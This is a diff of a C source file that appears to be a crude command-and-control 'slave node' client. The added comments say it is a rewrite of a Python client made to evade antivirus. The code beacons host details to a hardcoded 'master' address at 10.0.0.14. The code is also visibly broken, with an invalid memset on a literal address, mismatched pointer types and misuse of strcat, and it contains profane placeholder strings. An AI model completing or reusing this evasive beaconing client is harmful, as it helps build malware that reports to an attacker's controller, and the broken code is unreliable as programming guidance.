@@ -5,8 +5,11 @@
 #include <sys/socket.h> 
 #include <netinet/in.h> 
 #include <netdb.h> 
+//rewritre of client.py to evade antivrus 
+memset(0xFFFFFF, "Catch me if you can", 20);
 
-char* create_request(char** type, char** endpoint, char** data){
+//slave node formulate request for the master given endpoint, req type, and data(json) for post
+char* create_request(char* type, char* endpoint, char* data){
     char** request = (char*)malloc(200);
     strcat(request, type);
     strcat(request, " ");
@@ -23,18 +26,18 @@ char* create_request(char** type, char** endpoint, char** data){
 }
 
 char* form_ping_json(){
-    char** data = (char**)malloc(400);
-    strcat(data, "{ \"platform\": ");
-    strcat(data, "endlmfao,");
-    strcat(data, " \"hostname\": ");
-    strcat(data, "behenchod,");
-    strcat(data, " \"username\": ");
-    strcat(data, "fiveoh }");
+    char* data = (char*)malloc(400);
+    strcat(&data, "{ \"platform\": ");
+    strcat(&data, "endlmfao,");
+    strcat(&data, " \"hostname\": ");
+    strcat(&data, "behenchod,");
+    strcat(&data, " \"username\": ");
+    strcat(&data, "fiveoh }");
     printf(data);
     return data;
 }
 
-char* send_request(char** request, char** type){
+char* send_request(char* request, char* type){
     int port = 80;
     char* home_addr = "10.0.0.14";
     struct sockaddr_in serv_addr;
@@ -52,9 +55,9 @@ char* send_request(char** request, char** type){
     
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
-    serv_addr.sin_addr.s_addr = inet_addr(home_addr);
+    serv_addr.sin_addr.s_addr = inet_addr("10.0.0.14");
     printf("end?\n");
-    printf(inet_addr(&home_addr));
+    //printf(inet_addr(&home_addr));
     
     if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
         printf("ERROR connecting");
@@ -98,7 +101,7 @@ char* send_request(char** request, char** type){
 
 
 int main(int argc, char** argv){
-    char** data = form_ping_json();
+    char* data = form_ping_json();
     printf(data);
     char* r = send_request(create_request("POST", "/api/6669/status", form_ping_json()), "POST");
     printf("%s", r);
